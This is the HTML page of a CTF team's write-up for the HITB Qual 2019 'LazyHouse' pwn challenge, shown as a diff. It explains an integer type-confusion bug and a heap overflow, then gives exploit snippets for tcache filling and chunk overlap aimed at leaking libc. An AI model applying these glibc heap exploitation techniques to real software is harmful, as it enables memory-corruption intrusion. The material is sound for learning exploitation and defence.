@@ -1,0 +1,1569 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="writeups of f61d team">
+      
+      
+        <link rel="canonical" href="https://f61d.github.io/pwn/Heap/LazyHouse/">
+      
+      
+        <meta name="author" content="f61d">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.3">
+    
+    
+      
+        <title>LazyHouse - f61d</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.30686662.css">
+      
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#3f51b5">
+      
+    
+    
+      <script src="../../../assets/javascripts/modernizr.74668098.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#lazyhouse" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://f61d.github.io/" title="f61d" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              f61d
+            </span>
+            <span class="md-header-nav__topic">
+              
+                LazyHouse
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/f61d/f61d.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    f61d/f61d.github.io
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../../.." class="md-tabs__link">
+        home
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../web/" class="md-tabs__link">
+          web
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../" class="md-tabs__link md-tabs__link--active">
+          pwn
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../crypto/" class="md-tabs__link">
+          crypto
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../reverse/" class="md-tabs__link">
+          reverse
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../misc/" class="md-tabs__link">
+          misc
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../backup/gitpage_fuck/" class="md-tabs__link">
+          backup
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://f61d.github.io/" title="f61d" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    f61d
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/f61d/f61d.github.io/" title="Go to repository" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    f61d/f61d.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
+    
+    <label class="md-nav__link" for="nav-2-2">
+      SQLi
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        SQLi
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/SQLi/RootersCTF-Babyweb/" title="RootersCTF-Babyweb" class="md-nav__link">
+      RootersCTF-Babyweb
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
+    
+    <label class="md-nav__link" for="nav-2-3">
+      CommandInjection
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-3">
+        CommandInjection
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/CommandInjection/hitcon2019-virtual-public-network/" title="hitcon2019-virtual-public-network" class="md-nav__link">
+      hitcon2019-virtual-public-network
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4">
+    
+    <label class="md-nav__link" for="nav-2-4">
+      PHP
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-4">
+        PHP
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/PHP/WHUCTF-EasyPHP/" title="WHUCTF-EasyPHP" class="md-nav__link">
+      WHUCTF-EasyPHP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
+    
+    <label class="md-nav__link" for="nav-3-2">
+      VMEscape
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-2">
+        VMEscape
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../VMEscape/BabyQemu/" title="BabyQemu" class="md-nav__link">
+      BabyQemu
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3" checked>
+    
+    <label class="md-nav__link" for="nav-3-3">
+      Heap
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-3">
+        Heap
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        LazyHouse
+      </label>
+    
+    <a href="./" title="LazyHouse" class="md-nav__link md-nav__link--active">
+      LazyHouse
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    Vulnerability
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#type-confusion" class="md-nav__link">
+    Type Confusion
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#heap-overflow" class="md-nav__link">
+    Heap Overflow
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#diffifulty" class="md-nav__link">
+    Diffifulty
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#calloc" class="md-nav__link">
+    Calloc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#glibc-229" class="md-nav__link">
+    Glibc 2.29
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-enough-money" class="md-nav__link">
+    Get Enough Money
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#leak" class="md-nav__link">
+    Leak
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#house-of-lore" class="md-nav__link">
+    House of Lore
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      crypto
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../crypto/" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../reverse/" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      misc
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/" title="home" class="md-nav__link">
+      home
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">
+    
+    <label class="md-nav__link" for="nav-6-2">
+      blockchain
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-2">
+        blockchain
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/blockchain/RoarCTF2019_CoinFlip/" title="RoarCTF2019_CoinFlip" class="md-nav__link">
+      RoarCTF2019_CoinFlip
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-3" type="checkbox" id="nav-6-3">
+    
+    <label class="md-nav__link" for="nav-6-3">
+      forensic
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-3">
+        forensic
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../misc/forensic/Traffic_Analysis/" title="Traffic_Analysis" class="md-nav__link">
+      Traffic_Analysis
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      backup
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        backup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../backup/gitpage_fuck/" title="gitpage采坑" class="md-nav__link">
+      gitpage采坑
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    Vulnerability
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#type-confusion" class="md-nav__link">
+    Type Confusion
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#heap-overflow" class="md-nav__link">
+    Heap Overflow
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#diffifulty" class="md-nav__link">
+    Diffifulty
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#calloc" class="md-nav__link">
+    Calloc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#glibc-229" class="md-nav__link">
+    Glibc 2.29
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-enough-money" class="md-nav__link">
+    Get Enough Money
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#leak" class="md-nav__link">
+    Leak
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#house-of-lore" class="md-nav__link">
+    House of Lore
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/f61d/f61d.github.io/blob/dev/docs/pwn/Heap/LazyHouse.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="lazyhouse">LazyHouse<a class="headerlink" href="#lazyhouse" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>HITB Qual 2019</p>
+</blockquote>
+<h2 id="vulnerability">Vulnerability<a class="headerlink" href="#vulnerability" title="Permanent link">&para;</a></h2>
+<h3 id="type-confusion">Type Confusion<a class="headerlink" href="#type-confusion" title="Permanent link">&para;</a></h3>
+<p>The value of <code>(int64_t size)</code> is cast to <code>uint64</code>, and the high bits (higher than 64) of the result of <code>imul</code> can be ignored.
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/67b91283-f250-4b0e-8fde-97f4ccf6ce46.png" />
+For Example, if we enter a value <code>0x13f69b02593f69b1</code> as size of a house.
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/33094592-be70-41ab-91da-d18b3e923ead.jpg" />
+We can make the result of <code>imul</code> to be very small, which is the money we need to pay for the house.
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/556d4e0b-9d2e-492d-b257-de3c22601960.jpg" />
+After that, if we sell the house, we will get as much money as <code>size &lt;&lt; 6</code>.
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/58c00b5c-f951-49ea-9925-fe47780bcfd9.png" />
+In one word, we enter a <strong>size</strong> for house and then sell the house, we will get as much money as <code>-((uint64_t)(size * 0xda) &amp; 0xffffffffffffffff) + (uint64_t)(size &lt;&lt; 6)</code>.
+<font color=red>We fraudulently obtain money without paying anything~</font></p>
+<h3 id="heap-overflow">Heap Overflow<a class="headerlink" href="#heap-overflow" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>Only twice</p>
+</blockquote>
+<p>We can make a 32 bytes heap overflow when we upgrade a house.
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/64d9a464-5011-4f8f-9c71-3d60cb729709.png" /></p>
+<h2 id="diffifulty">Diffifulty<a class="headerlink" href="#diffifulty" title="Permanent link">&para;</a></h2>
+<h3 id="calloc">Calloc<a class="headerlink" href="#calloc" title="Permanent link">&para;</a></h3>
+<p>We can only buy a <strong>normal house</strong> and get a chunk allocated buy function <code>calloc</code>. If we want to use malloc, we need to buy a <strong>super house</strong>.
+The differences between <code>malloc</code> and <code>calloc</code> are shown as follows.
+- <code>calloc</code> will not use tcache bins for allocation.
+For <code>__libc_malloc</code>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/dccd560d-abb3-4cf8-a909-4b6e804f9924.png" />
+For <code>__libc_calloc</code>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/b8386520-3d1b-46cb-aa0b-f2017eac5cfb.png" />
+And, <code>_int_malloc</code> will directly search fastbins for allocating rather than searching tcache bins firstly.
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/395a9006-bf36-47e5-a813-bab06c277bb8.png" />
+- <code>calloc</code> will zero the memory got from <code>__int_malloc</code>.</p>
+<h3 id="glibc-229">Glibc 2.29<a class="headerlink" href="#glibc-229" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Glibc2.28 disallowed <strong>unsotedbin attack</strong> for arbitrary address writing. So, it is not easy to overwrite <code>global_max_fast</code> to fuck chunks and bins of any size into the range of fastbins.</li>
+<li>Glibc2.29 disallowed <strong>house of force</strong>.</li>
+</ol>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<h3 id="get-enough-money">Get Enough Money<a class="headerlink" href="#get-enough-money" title="Permanent link">&para;</a></h3>
+<p>I play the trick mentioned before to get the money close to 0xffffffffffffffff for further exploiting.
+<div class="codehilite"><pre><span></span>def fuck_money(size):
+    buy_house(7, size, &quot;\x00&quot;)
+    sell(7)
+    log.critical(hex(check_money()))
+
+fuck_money(0x13f69b02593f69b1)
+fuck_money(0x109bb0727572e2bd)
+fuck_money(0x13f2b1389a662c33)
+fuck_money(0x4fcace18cee3091)
+</pre></div>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/cbaa8b6f-b60b-4c5d-af07-06a2924d0a25.jpg" /></p>
+<h3 id="leak">Leak<a class="headerlink" href="#leak" title="Permanent link">&para;</a></h3>
+<p>If we want to make the address of libc appear in heap, we should make the tcache bins of our size full. It is great that <strong>calloc</strong> does not obtain bin from tcache bins. So, we can do buy and sell operation for more then 7 times to fill tcache bins of our size up.
+<div class="codehilite"><pre><span></span>make tcache size 0x217 full
+or i in range(0, 7):
+   buy_house(7, 0x217, &quot;\x00&quot;)
+   sell(7)
+</pre></div>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/329286fc-7b53-416b-8f85-46d2e05f257c.jpg" />
+<div class="codehilite"><pre><span></span>buy_house(2, 0x80, &quot;x&quot; * 0x10)
+sell(2)
+buy_house(0, 0x400, &quot;\xaa&quot; * 0x400)
+buy_house(1, 0xa0, &quot;\xbb&quot; * 0xa0)
+buy_house(2, 0x90, &quot;\xcc&quot; * 0x90)
+buy_house(3, 0x90, &quot;\xdd&quot; * 0x90)
+</pre></div>
+The distribution of the chunks is shown as follows.
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/73dffed6-facd-41a0-b481-5e24577c05a3.png" />
+Then, I use <strong>house 0</strong> to make the overflow to overwrite the size of the chunk at <strong>0x15d0</strong> to <strong>0x8d1</strong>.
+<div class="codehilite"><pre><span></span>#overlapping first
+upgrade(0, &quot;\xaa&quot; * 0x400 + p64(0) + p64(0x8d1))
+
+for i in range(0, 7):
+    buy_house(7, 0x90, &quot;\x11&quot; * 0x90)
+    sell(7)
+</pre></div>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/cb48b397-1a45-4758-a87f-5ec40a815ff3.png" />
+Then, I fill the tcache of size (0x90 + 0x10) up, and I make 4 chunk of this size, which will be free into unsorted bins.
+<div class="codehilite"><pre><span></span>for i in range(0, 7):
+    buy_house(7, 0x90, &quot;\x11&quot; * 0x90)
+    sell(7)
+
+#unsorted bin
+buy_house(4, 0x90, &quot;\x44&quot; * 0x90)
+buy_house(5, 0x90, &quot;\x55&quot; * 0x90)
+buy_house(6, 0x90, &quot;\x66&quot; * 0x90)
+buy_house(7, 0x90, &quot;\x77&quot; * 0x90)
+</pre></div>
+Than, I free the chunk(the size of which is overwrite with 0x8d1) at 0x15d0. So a big unsorted bin is list.
+<div class="codehilite"><pre><span></span>sell(1)
+</pre></div>
+<img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/Heap/LazyHouse/index_files/bbf2e852-9fbf-47d9-bd8a-605a59e2ddb2.png" />
+Then, I calloc the chunk of (0x8d0 - 0x10) to get the chunk again. Which is the most import is that, we then free the chunk of <strong>house 4</strong> and <strong>house 6</strong> to make them into unsorted bins.
+<div class="codehilite"><pre><span></span>buy_house(1, 0x8c0, &quot;\xbb&quot; * 0xa0 +
+          p64(0) + p64(0xa1) + &quot;\xcc&quot; * 0x90 +
+          p64(0) + p64(0xa1) + &quot;\xdd&quot; * 0x90 +
+          (p64(0) + p64(0xa1) + &quot;\x11&quot; * 0x90) * 7 +
+          p64(0) + p64(0xa1) + &quot;\x44&quot; * 0x90 +
+          p64(0) + p64(0xa1) + &quot;\x55&quot; * 0x90 +
+          p64(0) + p64(0xa1) + &quot;\x66&quot; * 0x90 + 
+          p64(0) + p64(0xa1) + &quot;\x77&quot; * 0x90 )
+#pause()
+sell(4)
+sell(6)
+</pre></div>
